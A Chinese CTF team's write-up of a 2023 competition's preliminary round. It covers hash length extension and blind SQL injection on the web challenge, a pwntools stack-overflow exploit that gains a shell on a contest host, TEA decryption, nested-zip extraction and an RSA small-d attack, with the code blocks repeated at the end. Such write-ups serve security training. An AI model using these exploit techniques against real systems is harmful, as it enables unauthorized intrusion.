# 2023年国家基地“楚慧杯”网络安全实践能力竞赛初赛WriteUp

> 原文: https://www.ctfiot.com/151842.html
> ID: 151842

恭喜

天权信安网络安全团队

在2023年国家基地“楚慧杯”网络安全实践能力竞赛国内相关技术爱好者组别中荣获第三名

下面将由本团队分享比赛部分解题过程：

WEB

哈希扩展攻击，若等于，直接伪造密码为password123进入。

然后发现文件名出存在SQL注入。

成功和不成功回显不一样，可以使用盲注，直接用sqlmap一把梭。

Eaaeval

PWN

ez_base

程序代码看不懂

Shift+f12能看到flag.txt字符串

猜测为后门函数地址，

然后运行程序，找溢出点

因此肯定存在栈溢出，垃圾数据的个数一个一个试，最后发现是0x28，填上返回地址

不知道为啥0x40490d不行，这里用的0x404911

脚本如下：

from pwn import *from struct import pack
from ctypes import *from LibcSearcher import *import base64import gmpy2li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')def s(a): p.send(a)def sa(a, b): p.sendafter(a, b)def sl(a): p.sendline(a)def sla(a, b): p.sendlineafter(a, b)def r(): p.recv()def pr(): print(p.recv())def rl(a): return p.recvuntil(a)def inter(): p.interactive()def bug(): gdb.attach(p) pause()def get_addr(): return u64(p.recvuntil(b'x7f')[-6:].ljust(8, b'x00'))def get_sb(): return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/shx00'))
context(os='linux', arch='amd64', log_level='debug')#p = process('./base')p = remote('tcp.cloud.dasctf.com', 29421)#elf = ELF('./base')libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")#libc = ELF('./libc-2.31.so')
rl("2:
decode")sl(str(1))rl("cin de_str:")pay=b'a'*(0x28)+p64(0x404911)#bug()sl(pay)
 inter()

REVERSE

Babyre

很明显的TEA

直接套网上脚本再改一下：

#include <stdio.h>#include <stdint.h> void decipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) { unsigned int i; uint32_t v0=v[0], v1=v[1], delta=0x9E3779B9, sum=delta*num_rounds; for (i=0; i < num_rounds; i++) { v1 -= ~(key[ (sum >> 11) & ((sum >> 11) ^ 0xFFFFFFFC)] + sum) & (v0 + (~(v0 >> 5) & (16 * v0) | ~(16 * v0) & (v0 >> 5))) | ~(v0 + (~(v0 >> 5) & (16 * v0) | ~(16 * v0) & (v0 >> 5))) & (key[ (sum >> 11) & ((sum >> 11) ^ 0xFFFFFFFC)] + sum); sum -= delta; v0 -= ~(key[~(~sum | 0xFFFFFFFC)] + sum) & (v1 + (~(v1 >> 5) & (16 * v1) | ~(16 * v1) & (v1 >> 5))) | ~(v1 + (~(v1 >> 5) & (16 * v1) | ~(16 * v1) & (v1 >> 5))) & (key[~(~sum | 0xFFFFFFFC)] + sum); } v[0]=v0; v[1]=v1;}

int main(){ uint32_t v[2]={ 2673635823L, 1004846423}; uint32_t const k[4]={0xDEADBEEF ,0x87654321,0xFACEB00C ,0xCAFEBABE}; unsigned int r=32; decipher(r, v, k); printf("解密后的数据：%u %un",v[0],v[1]);}

运行后得到flag

MISC

ez_zip

压缩包套娃解压，脚本如下

import osimport zipfileimport shutil
def find_latest_zip(directory):    zip_files = [f for f in os.listdir(directory) if f.endswith('.zip')]
    if not zip_files:        return None
    latest_zip = max(zip_files, key=os.path.getctime)    return os.path.join(directory, latest_zip)
def unzip_and_move(zip_file, extract_to, move_to):    try:        with zipfile.ZipFile(zip_file, 'r') as zip_ref:            zip_ref.extractall(extract_to)                files = os.listdir(extract_to)        for file in files:            source_path = os.path.join(extract_to, file)            destination_path = os.path.join(move_to, file)            shutil.move(source_path, destination_path)            print(f"移动文件 {file} 到根目录")
        return True    
except zipfile.BadZipFile:        print("无法解压 ZIP 文件！")        return False    
except Exception as e:        print(f"发生错误：{e}")        return False
def main():    root_directory = os.getcwd()
    extracted_directory = 'D:/比赛/楚慧杯/MISC/ez_zip的附件/tempdir/MISC附件/题目附件/'
    zip_directory = 'D:/比赛/楚慧杯/MISC/ez_zip的附件/tempdir/MISC附件/题目附件/'
    while True:        latest_zip = find_latest_zip(zip_directory)
        if latest_zip:            success = unzip_and_move(latest_zip, extracted_directory, root_directory)
            if success:                os.remove(latest_zip)        else:            print("没有找到更多的 ZIP 文件")            break
if __name__ == "__main__":    main()

>>> x='''01000100 01000001 01010011 01000011 01010100 01000110 01111011 00110001 00110000 01100011 00110101 00111000 00110010 00110101 00111000 01100011 01100011 01100110 00110001 01100101 00110111 01100011 00110110 00110011 00110001 01100101 00110101 00111001 00110001 00110001 01100101 01100100 00110110 01100001 01100011 01100011 00110100 01100101 01100100 01111101'''>>> s=x.split(' ')>>> ''.join(chr(int(c,2)) for c in s)'DASCTF{10c58258ccf1e7c631e5911ed6acc4ed}'

CRYPTO

so-large-e

http://www.hiencode.com/pub_asys.html

公钥解析得到n和e

https://github.com/Gao-Chuan/RSA-and-LLL-attacks/blob/master/boneh_durfee.sage

然后利用RSA-and-LLL-attacks解出d

n=0xA5ED986D5C338815D4A79DE8ED3A7D9639D72ACB3AEF28C5454C8A92C8F5774E48F99BD11373FAE5BCB24B710BC8D15EADAFEBB94EAFB3A96050CECBD1B2F2ADF9AA74256F2EA74A83D67188BDC25576C5808DDB1EEC01FF377FB183C36B1F79CED0E216CCCA64187FB84D5B0E06EF0C9E19D1F52C53903A7E814B47B4F47F6B
e = 0x00a18e9d8f15fa4257886b5723c9aca3f68076d6fa8ee604d89477702f51c6e4afbac0e928f7b54df7c86288a176e6642e2b58d72eaabb2808fbc8165fd81d83ca5433a5d8f94b683562fd0e44ca61a451f3d7a19b12731be466d90eb7d5d8e3058478332dc45fecc275749e10144891076a614bde2d0f0167fdb8175d561787e1 d = 663822343397699728953336968317794118491145998032244266550694156830036498673227937 c = 6838759631922176040297411386959306230064807618456930982742841698524622016849807235726065272136043603027166249075560058232683230155346614429566511309977857815138004298815137913729662337535371277019856193898546849896085411001528569293727010020290576888205244471943227253000727727343731590226737192613447347860
In [2]: x=pow(c,d,n)
In [3]: from libnum import *
In [4]: n2s(x)Out[4]: 'DASCTF{6f4fadce-5378-d17f-3c2d-2e064db4af19}'

— 结束 —

–天权信安网络安全团队–

网络无边 安全有界

2022，感恩有您

2023，携手同行

用技术撬动未来，用奋斗描绘成功！

–最新动态–

网络无边 安全有界

2022，感恩有您

2023，携手同行

AGCTF战队介绍

Ns1A战队介绍

国际关系学院网络空间安全学院介绍

木鱼安全团队介绍

SourceCode战队


```
from pwn import *from struct import pack
from ctypes import *from LibcSearcher import *import base64import gmpy2li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')def s(a): p.send(a)def sa(a, b): p.sendafter(a, b)def sl(a): p.sendline(a)def sla(a, b): p.sendlineafter(a, b)def r(): p.recv()def pr(): print(p.recv())def rl(a): return p.recvuntil(a)def inter(): p.interactive()def bug(): gdb.attach(p) pause()def get_addr(): return u64(p.recvuntil(b'x7f')[-6:].ljust(8, b'x00'))def get_sb(): return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/shx00'))
context(os='linux', arch='amd64', log_level='debug')#p = process('./base')p = remote('tcp.cloud.dasctf.com', 29421)#elf = ELF('./base')libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")#libc = ELF('./libc-2.31.so')
rl("2:
decode")sl(str(1))rl("cin de_str:")pay=b'a'*(0x28)+p64(0x404911)#bug()sl(pay)
 inter()
    #include <stdio.h>#include <stdint.h> void decipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) { unsigned int i; uint32_t v0=v[0], v1=v[1], delta=0x9E3779B9, sum=delta*num_rounds; for (i=0; i < num_rounds; i++) { v1 -= ~(key[ (sum >> 11) & ((sum >> 11) ^ 0xFFFFFFFC)] + sum) & (v0 + (~(v0 >> 5) & (16 * v0) | ~(16 * v0) & (v0 >> 5))) | ~(v0 + (~(v0 >> 5) & (16 * v0) | ~(16 * v0) & (v0 >> 5))) & (key[ (sum >> 11) & ((sum >> 11) ^ 0xFFFFFFFC)] + sum); sum -= delta; v0 -= ~(key[~(~sum | 0xFFFFFFFC)] + sum) & (v1 + (~(v1 >> 5) & (16 * v1) | ~(16 * v1) & (v1 >> 5))) | ~(v1 + (~(v1 >> 5) & (16 * v1) | ~(16 * v1) & (v1 >> 5))) & (key[~(~sum | 0xFFFFFFFC)] + sum); } v[0]=v0; v[1]=v1;}

int main(){ uint32_t v[2]={ 2673635823L, 1004846423}; uint32_t const k[4]={0xDEADBEEF ,0x87654321,0xFACEB00C ,0xCAFEBABE}; unsigned int r=32; decipher(r, v, k); printf("解密后的数据：%u %un",v[0],v[1]);}
import osimport zipfileimport shutil
def find_latest_zip(directory):    zip_files = [f for f in os.listdir(directory) if f.endswith('.zip')]
    if not zip_files:        return None
    latest_zip = max(zip_files, key=os.path.getctime)    return os.path.join(directory, latest_zip)
def unzip_and_move(zip_file, extract_to, move_to):    try:        with zipfile.ZipFile(zip_file, 'r') as zip_ref:            zip_ref.extractall(extract_to)                files = os.listdir(extract_to)        for file in files:            source_path = os.path.join(extract_to, file)            destination_path = os.path.join(move_to, file)            shutil.move(source_path, destination_path)            print(f"移动文件 {file} 到根目录")
        return True    
except zipfile.BadZipFile:        print("无法解压 ZIP 文件！")        return False    
except Exception as e:        print(f"发生错误：{e}")        return False
def main():    root_directory = os.getcwd()
    extracted_directory = 'D:/比赛/楚慧杯/MISC/ez_zip的附件/tempdir/MISC附件/题目附件/'
    zip_directory = 'D:/比赛/楚慧杯/MISC/ez_zip的附件/tempdir/MISC附件/题目附件/'
    while True:        latest_zip = find_latest_zip(zip_directory)
        if latest_zip:            success = unzip_and_move(latest_zip, extracted_directory, root_directory)
            if success:                os.remove(latest_zip)        else:            print("没有找到更多的 ZIP 文件")            break
if __name__ == "__main__":    main()
>>> x='''01000100 01000001 01010011 01000011 01010100 01000110 01111011 00110001 00110000 01100011 00110101 00111000 00110010 00110101 00111000 01100011 01100011 01100110 00110001 01100101 00110111 01100011 00110110 00110011 00110001 01100101 00110101 00111001 00110001 00110001 01100101 01100100 00110110 01100001 01100011 01100011 00110100 01100101 01100100 01111101'''>>> s=x.split(' ')>>> ''.join(chr(int(c,2)) for c in s)'DASCTF{10c58258ccf1e7c631e5911ed6acc4ed}'
n=0xA5ED986D5C338815D4A79DE8ED3A7D9639D72ACB3AEF28C5454C8A92C8F5774E48F99BD11373FAE5BCB24B710BC8D15EADAFEBB94EAFB3A96050CECBD1B2F2ADF9AA74256F2EA74A83D67188BDC25576C5808DDB1EEC01FF377FB183C36B1F79CED0E216CCCA64187FB84D5B0E06EF0C9E19D1F52C53903A7E814B47B4F47F6B
e = 0x00a18e9d8f15fa4257886b5723c9aca3f68076d6fa8ee604d89477702f51c6e4afbac0e928f7b54df7c86288a176e6642e2b58d72eaabb2808fbc8165fd81d83ca5433a5d8f94b683562fd0e44ca61a451f3d7a19b12731be466d90eb7d5d8e3058478332dc45fecc275749e10144891076a614bde2d0f0167fdb8175d561787e1 d = 663822343397699728953336968317794118491145998032244266550694156830036498673227937 c = 6838759631922176040297411386959306230064807618456930982742841698524622016849807235726065272136043603027166249075560058232683230155346614429566511309977857815138004298815137913729662337535371277019856193898546849896085411001528569293727010020290576888205244471943227253000727727343731590226737192613447347860
In [2]: x=pow(c,d,n)
In [3]: from libnum import *
In [4]: n2s(x)Out[4]: 'DASCTF{6f4fadce-5378-d17f-3c2d-2e064db4af19}'
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/6-1702831524.gif)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/10-1702831525.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/1-1702831526.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/3-1702831526.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/7-1702831527.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/10-1702831528.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/0-1702831528.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/6-1702831529.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/2-1702831530.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/12/6-1702831531.png)